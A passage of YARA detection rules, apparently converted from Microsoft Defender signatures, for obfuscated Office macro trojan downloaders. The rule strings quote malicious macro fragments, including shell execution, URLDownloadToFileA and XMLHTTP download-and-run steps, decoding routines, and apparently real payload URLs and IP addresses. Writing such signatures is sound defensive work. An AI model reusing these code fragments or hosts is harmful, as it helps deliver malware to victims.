        $x_1_8 = "& ChrW(CLng((Asc(\"M\")))) & Chr(CLng((AscW(\"i\")))) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAI_2147772514_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAI!MTB"
        threat_id = "2147772514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 2f [0-16] 22 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 77 72 69 74 65 20 [0-16] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 44 3a 5c [0-16] 2e 70 79 22 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 28 22 43 3a 5c 70 79 74 68 6f 6e [0-4] 5c 70 79 74 68 6f 6e 2e 65 78 65 20 22 22 44 3a 5c [0-16] 2e 70 79 22 22 20 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DWQ_2147772516_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DWQ!MTB"
        threat_id = "2147772516"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set qwdwq = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "qwdwq.RegWrite dwwqqqq(\"4C4F47596049727A6D76737271697278607B6D72686D76\"), dwwqqqq" ascii //weight: 1
        $x_1_3 = "Function dwwqqqq(str)" ascii //weight: 1
        $x_1_4 = "qwdwq.Run (dwwqqqq(\"" ascii //weight: 1
        $x_1_5 = "qwdwq.RegDelete dwwqqqq(\"" ascii //weight: 1
        $x_1_6 = {73 53 74 72 20 3d 20 73 53 74 72 20 2b 20 43 68 72 28 43 4c 6e 67 28 22 26 48 22 20 26 20 4d 69 64 28 73 74 72 2c 20 69 2c 20 32 29 29 20 2d 20 34 29 [0-21] 4e 65 78 74 [0-21] 64 77 77 71 71 71 71 20 3d 20 73 53 74 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DWS_2147772788_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DWS!MTB"
        threat_id = "2147772788"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set qwdwq = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "qwdwq.RegWrite dwwqqqq(\"" ascii //weight: 1
        $x_1_3 = "Function dwwqqqq(str)" ascii //weight: 1
        $x_1_4 = "qwdwq.Run (x)" ascii //weight: 1
        $x_1_5 = "qwdwq.RegDelete dwwqqqq(\"" ascii //weight: 1
        $x_1_6 = {73 53 74 72 20 3d 20 73 53 74 72 20 2b 20 43 68 72 28 43 4c 6e 67 28 22 26 48 22 20 26 20 4d 69 64 28 73 74 72 2c 20 69 2c 20 32 29 29 20 2d 20 33 29 [0-21] 4e 65 78 74 [0-21] 64 77 77 71 71 71 71 20 3d 20 73 53 74 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OJ_2147772791_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OJ!MTB"
        threat_id = "2147772791"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xlPyramidBarStacked100" ascii //weight: 1
        $x_1_2 = "ChrW(CLng((0.283018867924528 * 371)" ascii //weight: 1
        $x_1_3 = "xlDialogSetBackgroundPicture - 510.171717171717" ascii //weight: 1
        $x_1_4 = "(xlLess Xor (-859 - -878#)" ascii //weight: 1
        $x_1_5 = "(xlIMEModeNoControl And xlDataAndLabel)" ascii //weight: 1
        $x_1_6 = "InStr(b1cIFE6, LXQP_9Rkb_mm1, KxNAT9IjhwdqSvC)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVE_2147772891_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVE!MTB"
        threat_id = "2147772891"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WSc\" + Chr(114 + WDGcR + Owi0w) + \"ipt.\" + Chr$(79 + OuwoK + ZnxWl + 4) + \"hell\")" ascii //weight: 1
        $x_1_2 = "day = DateValue(\"12 / 12 / 2121\")" ascii //weight: 1
        $x_1_3 = "Dat.Run password, 0" ascii //weight: 1
        $x_1_4 = "Chr(81 + TWhzN + 18 + 2 + oGuRS + GUsqi) + Chr(32 + 20 + 13 + 23 + 1 + 8) + \"rth.\" + Chr(28 + 43 + 27) + ChrW(66 + yZjrP + 26 + 5 + A8mwd) + \"t\" & Chr(34)" ascii //weight: 1
        $x_1_5 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MJ_2147773008_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MJ!MTB"
        threat_id = "2147773008"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Selection.Borders(xlEdgeTop)" ascii //weight: 1
        $x_1_2 = "xlContinuous" ascii //weight: 1
        $x_1_3 = ".Weight = xlThin" ascii //weight: 1
        $x_1_4 = "gehseejwhegdpxcxmiiyngquazzbmymiuipbnxrw" ascii //weight: 1
        $x_1_5 = "dokdpvgwtpmafnsipweznpcqztaqpzyvqoapxgtw" ascii //weight: 1
        $x_1_6 = ".Create(qyfxywwkrjjrbyozonreehjisyjgibjpqliobtwd)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVF_2147773033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVF!MTB"
        threat_id = "2147773033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 20 22 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 22 20 26 20 22 [0-6] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-5] 20 3d 20 55 73 65 72 46 6f 72 6d 31 2e 43 6f 6e 74 72 6f 6c 73 2e 41 64 64 28 22 46 6f 72 6d 73 2e 43 6f 6d 62 6f 42 6f 78 2e 31 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-5] 29 2c 20 [0-6] 2c 20 31 2c 20}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 [0-5] 20 3d 20 [0-2] 2e 57 6f 72 6b 62 6f 6f 6b 73 2e 4f 70 65 6e 28 46 69 6c 65 4e 61 6d 65 3a 3d 55 73 65 72 46 6f 72 6d 32 2e 43 6f 6d 62 6f 42 6f 78 31 2c 20 50 61 73 73 77 6f 72 64 3a 3d 55 73 65 72 46 6f 72 6d 31 2e 43 6f 6d 62 6f 42 6f 78 32 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".Documents.Open ActiveDocument.FullName, ReadOnly:=True" ascii //weight: 1
        $x_1_6 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 4f 6e 54 69 6d 65 20 4e 6f 77 20 2b 20 54 69 6d 65 53 65 72 69 61 6c 28 30 2c 20 30 2c 20 32 30 29 2c 20 22 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 22 20 26 20 22 [0-6] 22}  //weight: 1, accuracy: Low
        $x_1_7 = "Cells(244, 11).Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OH_2147773072_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OH!MTB"
        threat_id = "2147773072"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "Now + TimeValue(\"0:00:05\")" ascii //weight: 1
        $x_1_3 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 2b 20 22 5c [0-8] 2e 62 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Chr((255 - Asc(Mid(vPwd, i, 1)" ascii //weight: 1
        $x_1_5 = ".Run (microsot(gf))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IDS_2147773271_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IDS!MTB"
        threat_id = "2147773271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Dim aWs6G As New Shell32.Shell" ascii //weight: 1
        $x_1_2 = "aWs6G.ShellExecute azAIbH, aHbP0, \" \", SW_SHOWNORMAL" ascii //weight: 1
        $x_1_3 = "awE3S = Split(aqGmn, Chr(" ascii //weight: 1
        $x_1_4 = "aQNpc = ActiveDocument.Content" ascii //weight: 1
        $x_1_5 = "Print #1, a8PN0" ascii //weight: 1
        $x_1_6 = "at1UP = ageu0o(aXLBA(aU0Cmw) Xor" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVG_2147773323_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVG!MTB"
        threat_id = "2147773323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = {2e 72 75 6e 20 [0-6] 20 26 20 61 52 6c 4d 79 78 28 22 63 6f 6d 6d 65 6e 74 73 22 29 20 26 20 61 6d 45 32 61 6b 20 26 20 [0-6] 20 26 20 61 6d 45 32 61 6b}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 [0-6] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-6] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "& \"\\m1.com\"" ascii //weight: 1
        $x_1_6 = "& \"\\m1.xsl\"" ascii //weight: 1
        $x_1_7 = "= Chr(34)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AW_2147773399_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AW!MTB"
        threat_id = "2147773399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "ghhfgfgdsfas.RegWrite hgfhffsadsa(a)" ascii //weight: 1
        $x_1_3 = "ghhfgfgdsfas.Run (hgfhffsadsa(c)" ascii //weight: 1
        $x_1_4 = "Application.Wait (Now + TimeValue(\"0:00:07\")" ascii //weight: 1
        $x_1_5 = "ghhfgfgdsfas.RegDelete hgfhffsadsa(d)" ascii //weight: 1
        $x_1_6 = "= sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)) - 12)" ascii //weight: 1
        $x_1_7 = "6F79702C3B6F2C7C6A7B83717E7F746A71786A782C39832C3D2C4D707039597C5C7E71" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AX_2147773403_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AX!MTB"
        threat_id = "2147773403"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Split(aFN2Bl, Chr(11 + 33))" ascii //weight: 1
        $x_1_2 = "aDweJ.ShellExecute aIfqk, a98NL, \" \", SW_SHOWNORMAL" ascii //weight: 1
        $x_1_3 = "\"110,115,123,103,100,121,110,121\"" ascii //weight: 1
        $x_1_4 = "\"104,49,87,123,121,100,108,121,106,102,111,106,127,106,87,106,70,100,108,92,37,99,127,106\"" ascii //weight: 1
        $x_1_5 = "Chr(aBOYX)" ascii //weight: 1
        $x_1_6 = "ageu0o(a7zMg(abZOj) Xor 11)" ascii //weight: 1
        $x_1_7 = "Dim aDweJ As New Shell32.Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AY_2147773471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AY!MTB"
        threat_id = "2147773471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CALL(\"urlmon\",\"URLDownl\"&CHAR(111)&\"adToFileA\"," ascii //weight: 1
        $x_1_2 = "\"JJCCJJ\",0,CHAR(104)&" ascii //weight: 1
        $x_1_3 = "\"ttps://rebrand.ly/iencli51bat\"" ascii //weight: 1
        $x_1_4 = "=EXEC(\"C:\\PROGRAMDATA\\a.bat\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVH_2147773493_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVH!MTB"
        threat_id = "2147773493"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 38 35 2e 32 34 33 2e 32 31 35 2e 32 31 33 2f 73 79 73 5f 69 6e 66 6f 2e 76 62 73 22 2c 20 46 61 6c 73 65 3e 00 78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = ".savetofile \"sys_info.vbs\", 2" ascii //weight: 1
        $x_1_3 = "Shell \"wscript sys_info.vbs\", vbNormalFocus" ascii //weight: 1
        $x_1_4 = "bStrm = CreateObject(\"Adodb.Stream\")" ascii //weight: 1
        $x_1_5 = "xHttp = CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BMK_2147773507_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BMK!MTB"
        threat_id = "2147773507"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 [0-9] 2c 20 43 68 72 28 31 31 20 2b 20 31 31 20 2b 20 31 31 20 2b 20 31 31 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 [0-9] 20 26 20 22 20 22 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = "= ActiveDocument.Content" ascii //weight: 1
        $x_1_4 = "= \"106,119,127,99,96,125,106,125\"" ascii //weight: 1
        $x_1_5 = "Reversed_String = Reversed_String & Next_Char" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AL_2147773549_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AL!MTB"
        threat_id = "2147773549"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\" h\" + \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"1\" + \"2\" + \"3\" + \"0\" + \"9\" + \"4\" + \"8\"" ascii //weight: 1
        $x_1_2 = "\"%\" + \"1\" + \"2\" + \"3\" + \"0\" + \"9\" + \"4\" + \"8\" + \"@\" + \"j\" + \".\" + \"m\" + \"p\" + \"/\"" ascii //weight: 1
        $x_1_3 = "Shell \"pi\" + \"ng\"" ascii //weight: 1
        $x_1_4 = "Shell \"c\" + \"m\" + \"d /\" + \"c m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_5 = "\"jasidj\" + \"djsalsda\" + \"dhnjksa\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CFZ_2147773551_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CFZ!MTB"
        threat_id = "2147773551"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Dim KLfaIrB, onbn, a, iZMXQXqQ, WLmiZi, RjGOTMhFd, glrcA, i" ascii //weight: 1
        $x_1_2 = "shdjsd = \"new:F935DC22\" + \"-1CF0-11D\" + \"0-ADB9-00C\" + \"04FD58A0B\"" ascii //weight: 1
        $x_1_3 = "uNAq.Run A2, 0" ascii //weight: 1
        $x_1_4 = "WLmiZi = Right(iZMXQXqQ, 1) & RjGOTMhFd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAV_2147773700_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAV!MTB"
        threat_id = "2147773700"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://synergyctsfl.com/falcon.exe" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "gift.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PCA_2147773735_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PCA!MTB"
        threat_id = "2147773735"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "licen1 = \"fl\" + \"st\" + \"udi\" + \"o\" + \".j\" + \"s\"" ascii //weight: 1
        $x_1_2 = "closm1 = \"ws\" + \"cr\" + \"i\" + \"p\" + \"t \" + licen1" ascii //weight: 1
        $x_1_3 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_4 = "Set fo = fso.CreateTextFile(licen1)" ascii //weight: 1
        $x_1_5 = "fo.WriteLine ignttext" ascii //weight: 1
        $x_1_6 = "Set fso = Nothing" ascii //weight: 1
        $x_1_7 = "ignttext = ignttext1 + ignttext2 + ignttext3 + ignttext4 + ignttext5" ascii //weight: 1
        $x_1_8 = "= \"try {WScript.Sleep(14000);var s = " ascii //weight: 1
        $x_1_9 = "ignttext15 = \"al(s);} catch(err) { }\"" ascii //weight: 1
        $x_1_10 = "104,116,116,112,58,47,47,49,57,52,46,51,55,46,57,55,46,49,51,53,58,49,49,53,53,47,39,32,43,32,67,44,32,102,97,108,115" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAW_2147773794_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAW!MTB"
        threat_id = "2147773794"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "This Ransomware was created using NRMW" ascii //weight: 1
        $x_1_2 = "code by Necronomikon/[D00MRiderz]" ascii //weight: 1
        $x_1_3 = "Shell Environ(\"\"SYSDIR\"\") & \"\"\\ftp.exe -s:c:\\nec.ftp\"\", vbHide" ascii //weight: 1
        $x_1_4 = "Shell \"\"c:\\infos4u.txt" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 22 22 63 3a 5c [0-16] 2e 73 63 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QWE_2147773932_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QWE!MTB"
        threat_id = "2147773932"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://statblogger.com/header.jpg" ascii //weight: 1
        $x_1_2 = "C:\\users\\Public\\\" + \"wt.jpg\"" ascii //weight: 1
        $x_1_3 = "Shell% (CounterVb + \" \"" ascii //weight: 1
        $x_1_4 = "ProcedureBufBuffer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVI_2147774133_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVI!MTB"
        threat_id = "2147774133"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = ".Run (asdsadsadwqdwqdqw(xx))" ascii //weight: 1
        $x_1_3 = "Application.Wait (Now + TimeValue(\"0:00:07\"))" ascii //weight: 1
        $x_1_4 = "ghhfgfgdsfas.RegDelete (asdsadsadwqdwqdqw(sxx))" ascii //weight: 1
        $x_1_5 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)) - 22)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BUK_2147774200_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BUK!MTB"
        threat_id = "2147774200"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(CLng((Not" ascii //weight: 1
        $x_1_2 = "Debug.Print" ascii //weight: 1
        $x_1_3 = "= Len(Join(Array(IWBnZCSwuBIm" ascii //weight: 1
        $x_1_4 = "= Len(Join(Array(aEmueqySV4Vv" ascii //weight: 1
        $x_1_5 = "= Len(Join(Array(\"qm9Q_i8A_rRj" ascii //weight: 1
        $x_1_6 = "= Len(Join(Array(BobhlsHjcoy8" ascii //weight: 1
        $x_1_7 = "= NeIkLIoQIdud.rT9yk_i3V_pVnf" ascii //weight: 1
        $x_1_8 = "= AksW4Rnj0.N9SEDQPEhcZn" ascii //weight: 1
        $x_1_9 = "= DnQF1_i6K9.VJdx5zyHf" ascii //weight: 1
        $x_1_10 = "= K7Iwdz05ZeIW8k8D.WFOp5rOuls" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAU_2147774202_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAU!MTB"
        threat_id = "2147774202"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
